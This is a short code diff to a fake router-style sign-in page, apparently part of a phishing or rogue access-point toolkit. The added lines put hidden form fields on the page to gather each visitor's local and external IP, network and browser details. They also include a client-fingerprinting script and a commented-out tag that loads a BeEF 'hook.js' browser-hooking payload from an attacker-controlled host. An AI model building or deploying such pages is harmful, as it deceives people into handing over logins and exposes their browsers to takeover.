@@ -231,6 +231,11 @@ display: none !important;
 
     <input id="redirect" name="redirect" type="redirect" class="hidden" value="http://192.168.1.1">
 
+    <input id="iplocal" name="iplocal" type="iplocal" class="hidden"></input>
+    <input id="ipexternal" name="ipexternal" type="ipexternal" class="hidden"></input>
+    <input id="network" name="network" type="network" class="hidden"></input>
+    <input id="browser" name="browser" type="browser" class="hidden"></input>
+
     <input name="signIn" class="button" type="submit" value="Sign in" />
     </div>
 </div>
@@ -242,3 +247,10 @@ display: none !important;
 </form>
 </body>
 </html>
+
+
+<!-- You got a beef with me? -->
+<!-- <script type="text/javascript" src="http://192.168.1.1:3000/hook.js"></script> -->
+
+{% include 'clientinfo.js' %}
+<?php include 'clientinfo.js';?>
